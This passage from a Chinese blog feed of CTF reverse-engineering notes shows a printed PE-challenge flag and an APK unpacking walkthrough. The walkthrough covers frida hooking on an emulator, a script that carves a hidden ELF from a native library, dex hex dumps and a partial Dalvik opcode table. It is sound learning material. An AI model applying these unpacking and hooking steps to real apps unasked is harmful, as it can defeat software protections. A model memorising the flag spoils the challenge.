flag:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;✅ 匹配格式: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Y0u_kn0w_what_1s_PE_File_F0rmat&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>reverse</category>
        <category>总结</category>
      </categories>
  </entry>
  <entry>
    <title>apk逆向部分总结持续更新</title>
    <url>/2025/09/12/apk%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/</url>
    <content><![CDATA[<h1 id="apk逆向部分总结持续更新"><a href="#apk逆向部分总结持续更新" class="headerlink" title="apk逆向部分总结持续更新"></a>apk逆向部分总结持续更新</h1><h2 id="strangeapp-apk-frida的使用"><a href="#strangeapp-apk-frida的使用" class="headerlink" title="strangeapp.apk(frida的使用)"></a>strangeapp.apk(frida的使用)</h2><p>先用jadx打开</p>
<p>一般主要逻辑就在源代码的com的MainActivity里面。</p>
<p>本题：</p>
<p>shell:</p>
<p>JniBridge主要用于 Java 与原生代码（如 C&#x2F;C++）之间的交互。</p>
<p>MainActivity在布局中的<code>sampleText</code>控件上显示文本 “hello”。</p>
<p>主要实现了应用启动时的初始化、环境检测、动态加载 Dex 文件等功能，是一个应用壳程序（Shell）。</p>
<p>strangeapp:</p>
<p>MainActivity用户在输入框中输入一段文本，点击按钮后，程序将其处理成字节数组（aa()），然后与 TARGET 比较（compareBytes），如果一致就弹出成功提示。</p>
<p>MainActivity$$ExternalSyntheticLambda0用来实现一个按钮的点击事件。</p>
<p>总的来说</p>
<p>它主要是一个”壳”（Shell），负责解密和加载真正的应用逻辑隐藏在assets的extract.dat。</p>
<p>壳的主要逻辑在native层，native层在apk(apk是zip文件可以解压)的lib里的so文件里。</p>
<p><img src="/2025/09/12/apk%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/1.png" alt="1"></p>
<p>so文件可以用IDA打开</p>
<p>分析so文件知道JNI_OnLoad&#96;函数处理APK中的隐藏数据（偏移298440处），映射为ELF文件并执行。flag可能由这个ELF文件生成或解密得出。</p>
<p>此时我们可以用frida进行hook。</p>
<p>先写一下frida的安装，我这里用的是夜神模拟器。</p>
<p>先用pip安转frida和frida-tools，我这里用的是conda安转的直接pip install xxx就行了。</p>
<p>然后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda activate xxxx </span><br><span class="line">pip install frida</span><br><span class="line">pip install frida-tools</span><br><span class="line">frida --version #查看版本</span><br></pre></td></tr></table></figure>

<p>我这里是16.5.9，然后去<a href="https://github.com/frida/frida/releases">官网</a>下载</p>
<p>然后到   夜神模拟器\Nox\bin  打开终端 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nox_adb.exe devices</span><br><span class="line">adb -s &lt;ip:port&gt; shell</span><br><span class="line">getprop ro.product.cpu.abi</span><br></pre></td></tr></table></figure>

<p><img src="/2025/09/12/apk%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/2.png" alt="1"></p>
<p>64位 所以我们下载frida-server-16.5.9-android-x86_64.xz</p>
<p>解压</p>
<p>再到 夜神模拟器\Nox\bin  打开终端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb push frida-server-16.5.9-android-x86_64 /data/local/tmp</span><br><span class="line">adb forward tcp:27042 tcp:27042</span><br><span class="line">adb forward tcp:27043 tcp:27043</span><br><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line">cd /data/local/tmp/</span><br><span class="line">chmod 755 frida-server-16.5.9-android-x86_64</span><br><span class="line">./frida-server-16.5.9-android-x86_64</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frida-ps -U #查看所有进程</span><br><span class="line">frida-ps -Ua #查看所有安装的应用</span><br><span class="line">frida -U -l hook.js -n &quot;com.example.myapp&quot;  #运行js脚本</span><br></pre></td></tr></table></figure>

<p>有时候会遇见闪退，就点击的时候立即运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb shell pidof com.swdd.strangeapp  #获取PID</span><br></pre></td></tr></table></figure>

<p>然后再用获取的PID运行hook.js注意此时不能点击模拟器。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frida -U -p PID -l hook.js</span><br></pre></td></tr></table></figure>

<p>用frida直接hook密文，秘钥，和iv直接猜测AES解密，这个感觉不是正解，正解应该是要脱壳。</p>
<p>先分析JNI_OnLoad的sub_1FDE8，可以知道高度混淆的原生库加载器。</p>
<p>用脚本提取出elf</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义Payload的起始偏移量</span></span><br><span class="line">PAYLOAD_OFFSET = <span class="number">0x48DC8</span>  <span class="comment"># 十进制 298440</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_payload</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    从输入的SO文件中提取Payload并保存到输出文件</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 检查输入文件是否存在</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(input_file):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;错误: 输入文件 &#x27;<span class="subst">&#123;input_file&#125;</span>&#x27; 不存在。&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f_in:</span><br><span class="line">            <span class="comment"># 跳转到Payload的起始偏移量</span></span><br><span class="line">            f_in.seek(PAYLOAD_OFFSET)</span><br><span class="line">            <span class="comment"># 读取从偏移量开始到文件末尾的所有数据</span></span><br><span class="line">            payload_data = f_in.read()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查是否读取到了数据</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> payload_data:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;错误: 在偏移量 <span class="subst">&#123;PAYLOAD_OFFSET&#125;</span> 之后没有数据。&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将数据写入输出文件</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f_out:</span><br><span class="line">            f_out.write(payload_data)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;成功! Payload 已从 &#x27;<span class="subst">&#123;input_file&#125;</span>&#x27; 提取到 &#x27;<span class="subst">&#123;output_file&#125;</span>&#x27;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;提取大小: <span class="subst">&#123;<span class="built_in">len</span>(payload_data)&#125;</span> 字节&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;提取过程中发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 如果没有提供参数，使用默认路径</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line">        input_file = <span class="string">r&quot;D:\桌面\libshell.so&quot;</span></span><br><span class="line">        output_file = <span class="string">r&quot;D:\桌面\payload.elf&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;使用默认路径: 输入文件=<span class="subst">&#123;input_file&#125;</span>, 输出文件=<span class="subst">&#123;output_file&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 使用提供的参数</span></span><br><span class="line">        input_file = sys.argv[<span class="number">1</span>]</span><br><span class="line">        output_file = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    extract_payload(input_file, output_file)</span><br></pre></td></tr></table></figure>

<p>把dat文件(在解压后的assets文件夹里)用010打开，分析。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据项1</span><br><span class="line">键: 0x003BEF18</span><br><span class="line">原始大小: 8 (0x08)</span><br><span class="line">数据: 70 10 27 AF 00 00 5B 01 22 73 5B 02 23 73 0E 00 (16字节)</span><br><span class="line"></span><br><span class="line">数据项2</span><br><span class="line">键: 0x003BEF38</span><br><span class="line">原始大小: 8 (0x08)</span><br><span class="line">数据: 54 20 22 73 54 21 23 73 6E 30 63 AD 10 03 0E 00 (16字节)</span><br><span class="line"></span><br><span class="line">数据项3</span><br><span class="line">键: 0x003BF224</span><br><span class="line">原始大小: 4 (0x04)</span><br><span class="line">数据: 70 10 27 AF 00 00 0E 00 (8字节)</span><br><span class="line"></span><br><span class="line">数据项4</span><br><span class="line">键: 0x003BF23C</span><br><span class="line">原始大小: 4 (0x04)</span><br><span class="line">数据: 70 10 27 AF 00 00 0E 00 (8字节)</span><br><span class="line"></span><br><span class="line">数据项5</span><br><span class="line">键: 0x003BF254</span><br><span class="line">原始大小: 4 (0x04)</span><br><span class="line">数据: 70 10 27 AF 00 00 0E 00 (8字节)</span><br><span class="line"></span><br><span class="line">数据项6</span><br><span class="line">键: 0x003BF26C</span><br><span class="line">原始大小: 4 (0x04)</span><br><span class="line">数据: 70 10 27 AF 00 00 0E 00 (8字节)</span><br><span class="line"></span><br><span class="line">数据项7</span><br><span class="line">键: 0x003BF284</span><br><span class="line">原始大小: 4 (0x04)</span><br><span class="line">数据: 70 10 27 AF 00 00 0E 00 (8字节)</span><br><span class="line"></span><br><span class="line">数据项8</span><br><span class="line">键: 0x003BF29C</span><br><span class="line">原始大小: 4 (0x04)</span><br><span class="line">数据: 70 10 27 AF 00 00 0E 00 (8字节)</span><br><span class="line"></span><br><span class="line">数据项9</span><br><span class="line">键: 0x003BF2B4</span><br><span class="line">原始大小: 4 (0x04)</span><br><span class="line">数据: 70 10 27 AF 00 00 0E 00 (8字节)</span><br><span class="line"></span><br><span class="line">数据项10</span><br><span class="line">键: 0x003BF2CC</span><br><span class="line">原始大小: 4 (0x04)</span><br><span class="line">数据: 70 10 27 AF 00 00 0E 00 (8字节)</span><br><span class="line"></span><br><span class="line">数据项11</span><br><span class="line">键: 0x003BF2E4</span><br><span class="line">原始大小: 4 (0x04)</span><br><span class="line">数据: 70 10 27 AF 00 00 0E 00 (8字节)</span><br><span class="line"></span><br><span class="line">数据项12</span><br><span class="line">键: 0x003BF088</span><br><span class="line">原始大小: 38 (0x26)</span><br><span class="line">数据: 13 00 30 00 23 00 E1 1D 26 00 06 00 00 00 69 00 24 73 0E 00 00 03 01 00 30 00 00 00 76 11 07 7C 9D 33 17 85 B2 17 CB 01 2A 6D B3 05 A9 0A B3 6A 4E 64 7B 8A D1 1F 13 38 73 97 F5 DA EE B8 0C 2A 11 37 87 D4 77 D7 57 76 5F B4 AC 45 (76字节)</span><br><span class="line"></span><br><span class="line">数据项13</span><br><span class="line">键: 0x003BF0E4</span><br><span class="line">原始大小: 4 (0x04)</span><br><span class="line">数据: 70 10 E5 16 00 00 0E 00 (8字节)</span><br><span class="line"></span><br><span class="line">数据项14</span><br><span class="line">键: 0x003BF024</span><br><span class="line">原始大小: 41 (0x29)</span><br><span class="line">数据: 38 04 28 00 6E 10 68 AF 04 00 0A 00 38 00 03 00 28 20 12 00 6E 20 51 AF 04 00 0A 00 DF 01 00 05 8E 11 22 02 C8 15 70 10 89 AF 02 00 6E 20 8D AF 12 00 0C 02 12 13 6E 20 79 AF 34 00 0C 03 6E 20 95 AF 32 00 0C 02 6E 10 A5 AF 02 00 0C 02 11 02 11 04 (82字节)</span><br><span class="line"></span><br><span class="line">数据项15</span><br><span class="line">键: 0x003BEFA0</span><br><span class="line">原始大小: 57 (0x39)</span><br><span class="line">数据: 1A 00 09 27 1A 01 09 27 22 02 A4 16 62 03 59 73 6E 20 60 AF 30 00 0C 03 1A 04 AC 36 71 10 5F AD 04 00 0C 04 70 30 50 B3 32 04 22 03 A3 16 62 04 59 73 6E 20 60 AF 41 00 0C 04 70 20 4F B3 43 00 1A 04 AD 36 71 10 5F AD 04 00 0C 04 71 10 4D B3 04 00 0C 04 12 15 6E 40 4E B3 54 32 62 05 59 73 6E 20 60 AF 57 00 0C 05 6E 20 4C B3 54 00 0C 05 11 05 (114字节)</span><br><span class="line"></span><br><span class="line">数据项16</span><br><span class="line">键: 0x003BEF58</span><br><span class="line">原始大小: 27 (0x1B)</span><br><span class="line">数据: 12 00 38 05 19 00 38 06 17 00 21 51 21 62 32 21 03 00 28 11 12 01 21 52 35 21 0C 00 48 02 05 01 48 03 06 01 32 32 03 00 0F 00 D8 01 01 01 28 F4 12 10 0F 00 0F 00 (54字节)</span><br><span class="line"></span><br><span class="line">数据项17</span><br><span class="line">键: 0x003BF1EC</span><br><span class="line">原始大小: 20 (0x14)</span><br><span class="line">数据: 22 00 C2 03 70 20 97 16 30 00 6E 20 A6 16 40 00 0C 00 1A 01 8D 6B 12 02 6E 30 B5 16 10 02 0C 00 6E 10 C1 16 00 00 0E 00 (40字节)</span><br><span class="line"></span><br><span class="line">数据项18</span><br><span class="line">键: 0x003BF0FC</span><br><span class="line">原始大小: 61 (0x3D)</span><br><span class="line">数据: 6E 10 EE 0F 05 00 0C 00 6E 10 2D AF 00 00 0C 00 70 20 60 AD 04 00 0C 01 62 02 24 73 70 30 61 AD 14 02 0A 02 38 02 08 00 1A 02 48 3D 70 20 66 AD 24 00 28 06 1A 02 58 6A 70 20 66 AD 24 00 28 1D 0D 01 22 02 C8 15 70 10 89 AF 02 00 1B 03 43 26 01 00 6E 20 95 AF 32 00 0C 02 6E 10 94 AE 01 00 0C 03 6E 20 95 AF 32 00 0C 02 6E 10 A5 AF 02 00 0C 02 70 20 66 AD 24 00 0E 00 (122字节)</span><br><span class="line"></span><br><span class="line">数据项19</span><br><span class="line">键: 0x003BF198</span><br><span class="line">原始大小: 33 (0x21)</span><br><span class="line">数据: 6F 20 FB 16 43 00 60 00 2B 73 6E 20 65 AD 03 00 60 00 2A 73 6E 20 62 AD 03 00 0C 00 1F 00 92 02 60 01 29 73 6E 20 62 AD 13 00 0C 01 1F 01 8A 02 22 02 56 15 70 30 5B AD 32 00 6E 20 73 0F 21 00 0E 00</span><br></pre></td></tr></table></figure>

<p>用dalvik源码打表，把extract.dat文件完全转为smali</p>
<p>原码地址<a href="https://github.com/UchihaL/Indroid/blob/master/libdex/DexOpcodes.h">Indroid&#x2F;libdex&#x2F;DexOpcodes.h at master · UchihaL&#x2F;Indroid · GitHub</a></p>
<p>由于我们仅对 extract.dat 这一个文件进行指令还原，还需要从原始的 classes.dex 文件中提取数据，将其中的字符串索引一并还原。</p>
<p>classes.dex解压apk就可以看到。</p>
<p>exp1</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Dict</span>, <span class="type">Tuple</span>, <span class="type">List</span>, <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s1_to_s8</span>(<span class="params">x: <span class="built_in">int</span>, bits: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    sign = <span class="number">1</span> &lt;&lt; (bits - <span class="number">1</span>)</span><br><span class="line">    mask = (<span class="number">1</span> &lt;&lt; bits) - <span class="number">1</span></span><br><span class="line">    x &amp;= mask</span><br><span class="line">    <span class="keyword">return</span> (x ^ sign) - sign</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s16</span>(<span class="params">x: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">&#x27;&lt;h&#x27;</span>, struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, x &amp; <span class="number">0xFFFF</span>))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s32_from_u2</span>(<span class="params">lo: <span class="built_in">int</span>, hi: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    v = (hi &lt;&lt; <span class="number">16</span>) | lo</span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">&#x27;&lt;i&#x27;</span>, struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, v))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s64_from_u2</span>(<span class="params">u1: <span class="built_in">int</span>, u2_: <span class="built_in">int</span>, u3: <span class="built_in">int</span>, u4: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    lo = (u2_ &lt;&lt; <span class="number">16</span>) | u1</span><br><span class="line">    hi = (u4 &lt;&lt; <span class="number">16</span>) | u3</span><br><span class="line">    v = (hi &lt;&lt; <span class="number">32</span>) | lo</span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">&#x27;&lt;q&#x27;</span>, struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, v &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span>))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex32</span>(<span class="params">n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;0x<span class="subst">&#123;(n &amp; <span class="number">0xFFFFFFFF</span>):08x&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex16</span>(<span class="params">n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;0x<span class="subst">&#123;(n &amp; <span class="number">0xFFFF</span>):04x&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex8</span>(<span class="params">n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;0x<span class="subst">&#123;(n &amp; <span class="number">0xFF</span>):02x&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">OPCODES: <span class="type">Dict</span>[<span class="built_in">int</span>, <span class="type">Tuple</span>[<span class="built_in">str</span>, <span class="built_in">str</span>, <span class="type">Optional</span>[<span class="built_in">int</span>], <span class="type">Optional</span>[<span class="built_in">int</span>]]] = &#123;</span><br><span class="line">    <span class="number">0x00</span>: (<span class="string">&quot;nop&quot;</span>, <span class="string">&quot;10x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x01</span>: (<span class="string">&quot;move&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x02</span>: (<span class="string">&quot;move/from16&quot;</span>, <span class="string">&quot;22x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x03</span>: (<span class="string">&quot;move/16&quot;</span>, <span class="string">&quot;32x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x04</span>: (<span class="string">&quot;move-wide&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x05</span>: (<span class="string">&quot;move-wide/from16&quot;</span>, <span class="string">&quot;22x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x06</span>: (<span class="string">&quot;move-wide/16&quot;</span>, <span class="string">&quot;32x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x07</span>: (<span class="string">&quot;move-object&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x08</span>: (<span class="string">&quot;move-object/from16&quot;</span>, <span class="string">&quot;22x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x09</span>: (<span class="string">&quot;move-object/16&quot;</span>, <span class="string">&quot;32x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x0a</span>: (<span class="string">&quot;move-result&quot;</span>, <span class="string">&quot;11x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x0b</span>: (<span class="string">&quot;move-result-wide&quot;</span>, <span class="string">&quot;11x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x0c</span>: (<span class="string">&quot;move-result-object&quot;</span>, <span class="string">&quot;11x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x0d</span>: (<span class="string">&quot;move-exception&quot;</span>, <span class="string">&quot;11x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x0e</span>: (<span class="string">&quot;return-void&quot;</span>, <span class="string">&quot;10x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x0f</span>: (<span class="string">&quot;return&quot;</span>, <span class="string">&quot;11x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x10</span>: (<span class="string">&quot;return-wide&quot;</span>, <span class="string">&quot;11x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x11</span>: (<span class="string">&quot;return-object&quot;</span>, <span class="string">&quot;11x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x12</span>: (<span class="string">&quot;const/4&quot;</span>, <span class="string">&quot;11n&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x13</span>: (<span class="string">&quot;const/16&quot;</span>, <span class="string">&quot;21s&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x14</span>: (<span class="string">&quot;const&quot;</span>, <span class="string">&quot;31i&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x15</span>: (<span class="string">&quot;const/high16&quot;</span>, <span class="string">&quot;21ih&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x16</span>: (<span class="string">&quot;const-wide/16&quot;</span>, <span class="string">&quot;21s&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x17</span>: (<span class="string">&quot;const-wide/32&quot;</span>, <span class="string">&quot;31i&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x18</span>: (<span class="string">&quot;const-wide&quot;</span>, <span class="string">&quot;51l&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x19</span>: (<span class="string">&quot;const-wide/high16&quot;</span>, <span class="string">&quot;21lh&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x1a</span>: (<span class="string">&quot;const-string&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">0</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x1b</span>: (<span class="string">&quot;const-string/jumbo&quot;</span>, <span class="string">&quot;31c&quot;</span>, <span class="number">0</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x1c</span>: (<span class="string">&quot;const-class&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">1</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x1d</span>: (<span class="string">&quot;monitor-enter&quot;</span>, <span class="string">&quot;11x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x1e</span>: (<span class="string">&quot;monitor-exit&quot;</span>, <span class="string">&quot;11x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x1f</span>: (<span class="string">&quot;check-cast&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">1</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x20</span>: (<span class="string">&quot;instance-of&quot;</span>, <span class="string">&quot;22c&quot;</span>, <span class="number">1</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x21</span>: (<span class="string">&quot;array-length&quot;</span>, <span class="string">&quot;12x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x22</span>: (<span class="string">&quot;new-instance&quot;</span>, <span class="string">&quot;21c&quot;</span>, <span class="number">1</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x23</span>: (<span class="string">&quot;new-array&quot;</span>, <span class="string">&quot;22c&quot;</span>, <span class="number">1</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x24</span>: (<span class="string">&quot;filled-new-array&quot;</span>, <span class="string">&quot;35c&quot;</span>, <span class="number">1</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x25</span>: (<span class="string">&quot;filled-new-array/range&quot;</span>, <span class="string">&quot;3rc&quot;</span>, <span class="number">1</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x26</span>: (<span class="string">&quot;fill-array-data&quot;</span>, <span class="string">&quot;31t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x27</span>: (<span class="string">&quot;throw&quot;</span>, <span class="string">&quot;11x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x28</span>: (<span class="string">&quot;goto&quot;</span>, <span class="string">&quot;10t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x29</span>: (<span class="string">&quot;goto/16&quot;</span>, <span class="string">&quot;20t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x2a</span>: (<span class="string">&quot;goto/32&quot;</span>, <span class="string">&quot;30t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x2b</span>: (<span class="string">&quot;packed-switch&quot;</span>, <span class="string">&quot;31t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x2c</span>: (<span class="string">&quot;sparse-switch&quot;</span>, <span class="string">&quot;31t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x2d</span>: (<span class="string">&quot;cmpl-float&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x2e</span>: (<span class="string">&quot;cmpg-float&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x2f</span>: (<span class="string">&quot;cmpl-double&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x30</span>: (<span class="string">&quot;cmpg-double&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x31</span>: (<span class="string">&quot;cmp-long&quot;</span>, <span class="string">&quot;23x&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x32</span>: (<span class="string">&quot;if-eq&quot;</span>, <span class="string">&quot;22t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x33</span>: (<span class="string">&quot;if-ne&quot;</span>, <span class="string">&quot;22t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x34</span>: (<span class="string">&quot;if-lt&quot;</span>, <span class="string">&quot;22t&quot;</span>, <span class="literal">None</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="number">0x35</span>: 